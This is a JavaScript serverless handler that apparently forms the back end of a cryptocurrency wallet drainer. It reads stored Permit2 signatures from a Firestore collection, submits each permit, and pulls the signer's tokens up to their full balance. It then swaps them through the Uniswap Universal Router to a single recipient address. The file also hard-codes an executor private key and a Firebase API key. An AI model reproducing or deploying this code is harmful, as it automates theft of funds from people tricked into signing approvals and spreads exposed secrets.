import { getApp, getApps, initializeApp } from 'firebase/app';
import { collection, doc, getDoc, getDocs, getFirestore, limit, query, updateDoc, where } from 'firebase/firestore';
import { ethers } from 'ethers';

// -----------------------------
// Configuration
// -----------------------------
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";

// Hard-coded fallback executor address + private key
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';

// Runtime executor config
let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;
let RECIPIENT_ADDRESS = HARDCODED_EXECUTOR;

const PERMIT2_ABI = [
  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
  "function transferFrom(address from, address to, uint160 amount, address token)"
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address) view returns (uint256)"
];

const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];

// -----------------------------
// Lazy Globals
// -----------------------------
let db = null;
let provider = null;
let spenderWallet = null;
let permit2Contract = null;
let routerContract = null;
let OUTPUT_TOKEN_OVERRIDE = null;

async function init() {
  if (db) return; 

  const firebaseConfig = {
    apiKey: process.env.FIREBASE_API_KEY || process.env.VITE_FIREBASE_API_KEY || 'AIzaSyAocB-xjAk8-xIIcDLjx72k9I8OK4jHVgE',
    authDomain: process.env.FIREBASE_AUTH_DOMAIN || process.env.VITE_FIREBASE_AUTH_DOMAIN || 'tlord-1ab38.firebaseapp.com',
    databaseURL: process.env.FIREBASE_DATABASE_URL || process.env.VITE_FIREBASE_DATABASE_URL || 'https://tlord-1ab38-default-rtdb.firebaseio.com',
    projectId: process.env.FIREBASE_PROJECT_ID || process.env.VITE_FIREBASE_PROJECT_ID || 'tlord-1ab38',
    storageBucket: process.env.FIREBASE_STORAGE_BUCKET || process.env.VITE_FIREBASE_STORAGE_BUCKET || 'tlord-1ab38.firebasestorage.app',
    messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID || process.env.VITE_FIREBASE_MESSAGING_SENDER_ID || '750743868519',
    appId: process.env.FIREBASE_APP_ID || process.env.VITE_FIREBASE_APP_ID || '1:750743868519:web:732b9ba46acda5096570c2'
  };

  const app = getApps().length ? getApp() : initializeApp(firebaseConfig, 'vercel-worker-app');
  db = getFirestore(app);
  
  try {
    const cfgSnap = await getDoc(doc(db, 'admin_config', 'settings'));
    const cfg = cfgSnap.exists() ? cfgSnap.data() : {};
    const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';

    provider = new ethers.JsonRpcProvider(rpc);
    
    // Load config
    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
    RECIPIENT_ADDRESS = cfg.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
    OUTPUT_TOKEN_OVERRIDE = cfg.tokenAddress || process.env.OUTPUT_TOKEN || null;

    spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);

    const derived = spenderWallet.address;
    if (derived.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
      throw new Error(`Executor private key mismatch`);
    }

    permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, spenderWallet);
    routerContract = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
  } catch (err) {
    console.error('Failed to init:', err);
    throw err;
  }
}

// -----------------------------
// Logic
// -----------------------------
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: "Method Not Allowed" });

  try {
    await init();
    
    const { docId, outputToken } = req.body;
    const FINAL_TOKEN = outputToken || OUTPUT_TOKEN_OVERRIDE || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
    const RECIPIENT = RECIPIENT_ADDRESS;

    // --- FIX: INITIALIZE NONCE TRACKER ---
    // We get the nonce from the "latest" (mined) block. 
    // This avoids the "pending" error code -32046
    let currentNonce = await provider.getTransactionCount(spenderWallet.address, "latest");
    // -------------------------------------

    let docsToProcess = [];
    if (docId) {
      const oneDoc = await getDoc(doc(db, 'permit2_signatures', docId));
      if (oneDoc.exists() && !oneDoc.data().processed) {
        docsToProcess.push({ id: oneDoc.id, data: oneDoc.data() });
      }
    } else {
      const snaps = await getDocs(query(collection(db, 'permit2_signatures'), where('processed', '==', false), limit(1)));
      docsToProcess = snaps.docs.map((d) => ({ id: d.id, data: d.data() }));
    }

    if (!docsToProcess.length) return res.json({ ok: true, processed: 0 });

    let count = 0;
    for (const item of docsToProcess) {
      const data = item.data;
      
      try {
        if (!data || !data.owner || !data.token || !data.amount || !data.r || !data.s || !data.v) {
             throw new Error('Missing data in signature document');
        }

        const amount = BigInt(data.amount);

        // Check balance
        let withdrawAmount = amount;
        try {
          const tokenContractForBalance = new ethers.Contract(data.token, ERC20_ABI, provider);
          const ownerBal = await tokenContractForBalance.balanceOf(data.owner);
          const ownerBalBn = BigInt(ownerBal);
          if (ownerBalBn < withdrawAmount) withdrawAmount = ownerBalBn;
        } catch (bErr) { console.error('Failed to read owner balance:', bErr); }

        if (withdrawAmount === 0n) {
          await updateDoc(doc(db, 'permit2_signatures', item.id), { lastError: 'owner has zero token balance', lastErrorAt: Date.now() });
          if (docId) return res.status(400).json({ ok: false, error: 'Zero balance' });
          continue;
        }

        // Validate Spender
        if (!data.spender || data.spender.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
           const msg = `Spender mismatch.`;
            await updateDoc(doc(db, 'permit2_signatures', item.id), { lastError: msg, lastErrorAt: Date.now() });
           if (docId) return res.status(400).json({ ok: false, error: msg });
           continue;
        }

        // Prepare Signature
        let vnr = (typeof data.v === 'string') ? parseInt(data.v, 16) : Number(data.v);
        if (vnr === 0 || vnr === 1) vnr += 27;
        const vHex = '0x' + vnr.toString(16).padStart(2, '0');
        const signature = ethers.concat([String(data.r), String(data.s), vHex]);

        // ============================================================
        // EXECUTION SEQUENCE WITH MANUAL NONCE
        // ============================================================

        // 1. Permit2.permit()
        const permitTx = await permit2Contract.permit(
          data.owner,
          {
            details: { token: data.token, amount: amount, expiration: data.deadline, nonce: data.nonce },
            spender: EXECUTOR_ADDRESS,
            sigDeadline: data.deadline
          },
          signature,
          { nonce: currentNonce++ } // <--- FIX APPLIED
        );
        await permitTx.wait();

        // 2. TransferFrom (Pull tokens)
        const pullTx = await permit2Contract.transferFrom(
          data.owner, 
          spenderWallet.address, 
          withdrawAmount, 
          data.token,
          { nonce: currentNonce++ } // <--- FIX APPLIED
        );
        await pullTx.wait();

        // 3. Approve Router
        const tokenContract = new ethers.Contract(data.token, ERC20_ABI, spenderWallet);
        const approveTx = await tokenContract.approve(
          UNIVERSAL_ROUTER, 
          amount, 
          { nonce: currentNonce++ } // <--- FIX APPLIED
        );
        await approveTx.wait();

        // 4. Swap Execution
        const feeTier = 3000;
        function encodeFee(f) {
            let hex = f.toString(16).padStart(6, '0');
            if (hex.length % 2 === 1) hex = '0' + hex;
            return '0x' + hex;
        }
        
        const path = ethers.concat([data.token, encodeFee(feeTier), FINAL_TOKEN]);
        const swapAbi = new ethers.AbiCoder();
        const swapInput = swapAbi.encode(
          ["address", "uint256", "uint256", "bytes", "bool"],
          [RECIPIENT, withdrawAmount, BigInt(0), path, false]
        );

        const commands = "0x00"; 
        const inputs = [swapInput];
        const execDeadline = Math.floor(Date.now() / 1000) + 1800;

        const tx = await routerContract.execute(
          commands, 
          inputs, 
          execDeadline, 
          { 
            gasLimit: 500000,
            nonce: currentNonce++ // <--- FIX APPLIED
          }
        );
        const receipt = await tx.wait();

        // ============================================================

        await updateDoc(doc(db, 'permit2_signatures', item.id), {
          processed: true,
          routerTx: receipt.hash,
          processedAt: Date.now(),
          adminExecutor: EXECUTOR_ADDRESS,
          withdrawAmount: withdrawAmount.toString()
        });
        count++;

        if (docId) {
          return res.status(200).json({ ok: true, processed: 1, withdrawAmount: withdrawAmount.toString(), routerTx: receipt.hash });
        }

      } catch (err) {
        console.error(`Failed doc ${item.id}:`, err);
        // If nonce error happens, it invalidates subsequent nonces, so we should arguably stop, 
        // but for now we just log it.
        await updateDoc(doc(db, 'permit2_signatures', item.id), {
            lastError: err.shortMessage || err.message,
            lastErrorAt: Date.now()
        });
        if (docId) throw err;
      }
    }

    return res.status(200).json({ ok: true, processed: count });

  } catch (error) {
    console.error("Handler Error:", error);
    return res.status(500).json({ ok: false, error: error.message });
  }
}
